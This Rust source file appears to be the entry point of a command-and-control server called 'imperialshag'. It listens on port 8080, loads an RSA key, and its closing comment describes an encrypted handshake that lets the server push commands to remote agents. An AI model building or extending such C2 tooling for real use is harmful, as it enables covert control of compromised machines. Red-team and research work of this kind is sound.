use std::sync::Arc;
use tokio::signal;
use tokio::sync::Mutex;

mod crypto;
mod server;
mod socket;

const IP: &'static str = "0.0.0.0";
const PORT: u16 = 8080;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Welcome to imperialshag :)");
    println!("Starting TCP server.");

    let rsa_private_key = crypto::load_private_rsa("private.pem").await.unwrap();

    let server = Arc::new(Mutex::new(server::Server::new(rsa_private_key)));

    server::start_cnc_server(IP, PORT, &server).await?;
    signal::ctrl_c().await?;

    // let my_server = Arc::clone(&server);
    // let mut lock = my_server.lock().await;
    // lock.broadcast_command(b"test".to_vec()).await.unwrap();
    // std::mem::drop(lock);
    // signal::ctrl_c().await?;
    Ok(())
}

/*
 HANDSHAKING PROCESS
• SERVER   ----- Public RSA KEY -----> AGENT // Agent side: SERVER_HELLO
• AGENT    ----- AES256 Encrypted with the Public RSA Key -----> SERVER // Server side: AGENT_HELLO
    * Server decrypts the AES256 with the Private RSA Key *
• SERVER   ----- HANDSHAKE ACK -----> AGENT // Agent side: SERVER_HANDSHAKE_ACK
• AGENT    ----- HANDSHAKE ACK -----> SERVER // Server side: AGENT_HANDSHAKE_ACK
    * Server may now send commands to the agent encrypted with the AES256 Key*
*/
